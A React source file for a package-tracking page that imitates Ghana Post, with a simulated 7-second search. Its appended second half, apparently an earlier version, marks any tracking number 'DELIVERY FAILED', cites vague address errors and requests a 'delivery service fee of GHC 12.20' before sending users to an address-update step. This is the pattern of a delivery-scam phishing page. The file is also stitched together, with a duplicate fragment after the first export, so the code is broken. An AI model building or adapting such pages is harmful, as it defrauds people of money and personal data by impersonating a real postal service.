import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import StepIndicator from '../components/StepIndicator';

function DeliveryStatus({ formData, setFormData }) {
  const navigate = useNavigate();
  const [trackingNumber, setTrackingNumber] = useState('');
  const [hasSearched, setHasSearched] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [trackingData, setTrackingData] = useState(null);
  const [routeLocations, setRouteLocations] = useState([]);

  // Tracking number format: GH-PKG-YYYY-XXXXXX
  const trackingRegex = /^GH-PKG-\d{4}-\d{6}$/;

  // Fetch route locations on mount
  useEffect(() => {
    const fetchRoutes = async () => {
      try {
        const response = await fetch(`${process.env.REACT_APP_API_URL}/api/tracking/routes`);
        if (response.ok) {
          const result = await response.json();
          setRouteLocations(result.data);
        }
      } catch (error) {
        console.error('Error fetching routes:', error);
      }
    };
    fetchRoutes();
  }, []);

  // Simulate 7-second loading bar
  useEffect(() => {
    if (isLoading) {
      const interval = setInterval(() => {
        setLoadingProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setIsLoading(false);
            setHasSearched(true);
            return 100;
          }
          // Progress increases over 7 seconds (7000ms)
          return prev + (100 / 70); // 70 increments in 7 seconds
        });
      }, 100);

      return () => clearInterval(interval);
    }
  }, [isLoading]);

  const handleTrack = async () => {
    setError('');
    
    if (!trackingNumber.trim()) {
      setError('Please enter a tracking number');
      return;
    }

    if (!trackingRegex.test(trackingNumber)) {
      setError('Invalid format. Use format: GH-PKG-YYYY-XXXXXX (e.g., GH-PKG-2024-001234)');
      return;
    }

    // Start loading animation
    setLoadingProgress(0);
    setIsLoading(true);
    
    // Fetch tracking data after loading completes
    setTimeout(async () => {
      try {
        const response = await fetch(`${process.env.REACT_APP_API_URL}/api/tracking/${trackingNumber}`);
        if (response.ok) {
          const result = await response.json();
          setTrackingData(result.data);
          
          // Update formData with the tracking number
          setFormData(prev => ({
            ...prev,
            packageNumber: trackingNumber
          }));
        } else {
          setError('Tracking code not found. Please check and try again.');
          setIsLoading(false);
          setLoadingProgress(0);
        }
      } catch (error) {
        console.error('Error fetching tracking data:', error);
        setError('Error retrieving tracking information.');
        setIsLoading(false);
        setLoadingProgress(0);
      }
    }, 7100); // After 7 second loading
  };

  const handleContinue = () => {
    navigate('/address');
  };

  const handleInputChange = (e) => {
    let value = e.target.value.toUpperCase();
    setTrackingNumber(value);
    setError('');
  };

  const getCurrentLocationIndex = () => {
    if (!trackingData) return 0;
    const index = routeLocations.findIndex(loc => loc.location === trackingData.currentLocation);
    return index >= 0 ? index : 0;
  };

  if (isLoading) {
    return (
      <div className="container">
        <StepIndicator currentStep={1} />
        
        <div className="status-card">
          <div className="loading-section">
            <h2>Searching for your package...</h2>
            <div className="loading-bar-container">
              <div className="loading-bar" style={{ width: `${loadingProgress}%` }}></div>
            </div>
            <p className="loading-text">{Math.round(loadingProgress)}%</p>
          </div>
        </div>
      </div>
    );
  }

  if (hasSearched && trackingData) {
    const currentLocationIndex = getCurrentLocationIndex();
    
    return (
      <div className="container">
        <StepIndicator currentStep={1} />
        
        <div className="status-card">
          <div className="status-header">
            <div className="status-number">Your Package Tracking Number</div>
            <div className="package-number">{trackingData.trackingCode}</div>
            <div className="status-badge">📍 {trackingData.currentStatus}</div>
          </div>

          {/* Tracking Route */}
          <div className="tracking-route-section">
            <h3>Shipment Route</h3>
            <div className="route-timeline">
              {routeLocations.map((location, idx) => (
                <div key={idx} className={`route-step ${idx <= currentLocationIndex ? 'completed' : 'pending'}`}>
                  <div className="route-marker">
                    {idx <= currentLocationIndex ? '✓' : idx + 1}
                  </div>
                  <div className="route-info">
                    <p className="route-location">{location.location}</p>
                    <p className="route-description">{location.description}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Current Status */}
          <div className="alert-banner">
            <div className="alert-icon">📦</div>
            <div className="alert-content">
              <h2>Current Location</h2>
              <p>{trackingData.currentLocation}</p>
              <p className="status-text">{trackingData.currentStatus}</p>
              {trackingData.estimatedDelivery && (
                <p className="estimated-delivery">Estimated Delivery: {trackingData.estimatedDelivery}</p>
              )}
            </div>
          </div>

          <div style={{ marginTop: '2rem', textAlign: 'center' }}>
            <button onClick={handleContinue} className="btn btn-primary btn-lg btn-block">
              Continue →
            </button>
          </div>
        </div>

        <div style={{ marginTop: '2rem', textAlign: 'center', color: '#666', fontSize: '0.9rem' }}>
          <p>Need help? Contact Ghana Post Customer Service at +233 (0) 800 800 800</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <StepIndicator currentStep={1} />
      
      <div className="status-card">
        <div className="tracking-input-section">
          <h1>Track Your Package</h1>
          <p className="section-subtitle">Enter your tracking number to check the status of your delivery</p>
          
          <div className="tracking-form">
            <div className="form-group">
              <label htmlFor="tracking">Package Tracking Number</label>
              <input
                type="text"
                id="tracking"
                value={trackingNumber}
                onChange={handleInputChange}
                placeholder="GH-PKG-2024-001234"
                className={`tracking-input ${error ? 'input-error' : ''}`}
              />
              <p className="input-hint">Format: GH-PKG-YYYY-XXXXXX</p>
              {error && <p className="error-message">⚠️ {error}</p>}
            </div>

            <button onClick={handleTrack} className="btn btn-primary btn-lg">
              Track Package
            </button>
          </div>

          <div className="tracking-info">
            <h3>How to find your tracking number:</h3>
            <ul>
              <li>Check your shipping confirmation email</li>
              <li>Look at your receipt or shipping label</li>
              <li>Contact the shipper if you don't have your tracking number</li>
            </ul>
          </div>
        </div>
      </div>

      <div style={{ marginTop: '2rem', textAlign: 'center', color: '#666', fontSize: '0.9rem' }}>
        <p>Need help? Contact Ghana Post Customer Service at +233 (0) 800 800 800</p>
      </div>
    </div>
  );
}

export default DeliveryStatus;
            <p className="loading-text">{Math.round(loadingProgress)}%</p>
          </div>
        </div>
      </div>
    );
  }

  if (hasSearched) {
    return (
      <div className="container">
        <StepIndicator currentStep={1} />
        
        <div className="status-card">
          <div className="status-header">
            <div className="status-number">Your Package Tracking Number</div>
            <div className="package-number">{trackingNumber}</div>
            <div className="status-badge">⚠️ DELIVERY FAILED</div>
          </div>

          <div className="alert-banner">
            <div className="alert-icon">🚫</div>
            <div className="alert-content">
              <h2>Delivery Failed - Action Required</h2>
              <p>
                Your package delivery was unsuccessful. We need you to update your delivery
                address to ensure successful delivery. Please review the issues below and provide
                the necessary corrections.
              </p>
            </div>
          </div>

          <div className="bullet-points">
            <p style={{ fontWeight: '600', marginBottom: '1rem' }}>Reasons for Delivery Failure:</p>
            <ul>
              <li>Incorrect or incomplete delivery address provided</li>
              <li>Recipient address could not be verified in our system</li>
              <li>Additional address confirmation required for successful delivery</li>
            </ul>
          </div>

          <div style={{ marginTop: '2rem', textAlign: 'center' }}>
            <p style={{ marginBottom: '1.5rem', color: '#666', lineHeight: '1.6' }}>
              To proceed with the re-delivery of your package, please update your delivery
              address with accurate and complete information. A delivery service fee of GHC 12.20
              will be required.
            </p>
            <button onClick={handleContinue} className="btn btn-primary btn-lg btn-block">
              Continue to Update Address →
            </button>
          </div>
        </div>

        <div style={{ marginTop: '2rem', textAlign: 'center', color: '#666', fontSize: '0.9rem' }}>
          <p>Need help? Contact Ghana Post Customer Service at +233 (0) 800 800 800</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <StepIndicator currentStep={1} />
      
      <div className="status-card">
        <div className="tracking-input-section">
          <h1>Track Your Package</h1>
          <p className="section-subtitle">Enter your tracking number to check the status of your delivery</p>
          
          <div className="tracking-form">
            <div className="form-group">
              <label htmlFor="tracking">Package Tracking Number</label>
              <input
                type="text"
                id="tracking"
                value={trackingNumber}
                onChange={handleInputChange}
                placeholder="GH-PKG-2024-001234"
                className={`tracking-input ${error ? 'input-error' : ''}`}
              />
              <p className="input-hint">Format: GH-PKG-YYYY-XXXXXX</p>
              {error && <p className="error-message">⚠️ {error}</p>}
            </div>

            <button onClick={handleTrack} className="btn btn-primary btn-lg">
              Track Package
            </button>
          </div>

          <div className="tracking-info">
            <h3>How to find your tracking number:</h3>
            <ul>
              <li>Check your shipping confirmation email</li>
              <li>Look at your receipt or shipping label</li>
              <li>Contact the shipper if you don't have your tracking number</li>
            </ul>
          </div>
        </div>
      </div>

      <div style={{ marginTop: '2rem', textAlign: 'center', color: '#666', fontSize: '0.9rem' }}>
        <p>Need help? Contact Ghana Post Customer Service at +233 (0) 800 800 800</p>
      </div>
    </div>
  );
}

export default DeliveryStatus;
